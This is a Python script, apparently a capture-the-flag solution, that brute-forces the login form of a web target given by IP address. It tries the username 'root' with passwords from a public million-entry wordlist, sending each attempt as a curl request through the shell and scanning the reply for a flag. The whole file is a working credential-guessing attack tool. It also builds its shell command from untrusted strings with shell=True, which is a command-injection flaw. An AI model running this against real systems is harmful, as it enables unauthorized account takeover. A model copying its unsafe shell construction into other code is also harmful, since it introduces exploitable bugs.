import requests, sys, subprocess

password_list_url = "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt"
username = "root"

def get_password_list(url):
	response = requests.get(url)
	return response.text.splitlines()

def run_curl_command(ip, password):
	curl_command = f'curl -s "http://{ip}/index.php?page=signin&username={username}&password={password}&Login=Login#"'
	grep_command = "grep flag | awk -F': | <' '{print \"\\nThe flag is: \"$2}'"
	
	full_command = f"{curl_command} | {grep_command}"
	
	try:
		result = subprocess.check_output(full_command, shell=True, stderr=subprocess.PIPE)
		return result.decode().strip()
	except subprocess.CalledProcessError:
		return None

def bruteforce(ip):
	try:
		response = requests.get(f"http://{ip}", timeout=3)
		response.raise_for_status()
	except requests.exceptions.RequestException as e:
		print("Connection failed. Bad IP or network issue!")
		return False

	password_list = get_password_list(password_list_url)
	for password in password_list:
		password = password.strip()
		
		flag = run_curl_command(ip, password)
		
		if flag:
			print(f"Success! Username: {username} Password: {password}")
			print(flag)
			return True
	
	print("Password not found in the list.")
	return False

def main():
	if len(sys.argv) != 2:
		print("Usage: python script.py <ip>")
		sys.exit(1)
	bruteforce(sys.argv[1])

if __name__ == "__main__":
	main()
